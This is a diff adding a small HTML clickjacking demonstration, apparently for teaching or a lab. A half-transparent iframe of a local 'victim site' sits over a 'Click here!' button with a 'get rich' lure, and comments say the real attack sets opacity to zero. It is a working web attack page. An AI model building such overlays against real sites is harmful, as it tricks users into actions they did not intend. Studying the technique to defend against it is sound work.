@@ -1,0 +1,16 @@
+<style>
+iframe { /* iframe from the victim site */
+  height:500px; width:1000px;
+  position: absolute;
+  top:0; left:-20px;
+  opacity: 0.5; /* in real opacity:0 */
+  z-index: 1; 
+}
+</style>
+
+<div>Click to get rich now:</div>
+
+<!-- The url from the victim site -->
+<iframe src="http://localhost:8080/myprojects.php"></iframe>
+
+<button>Click here!</button>
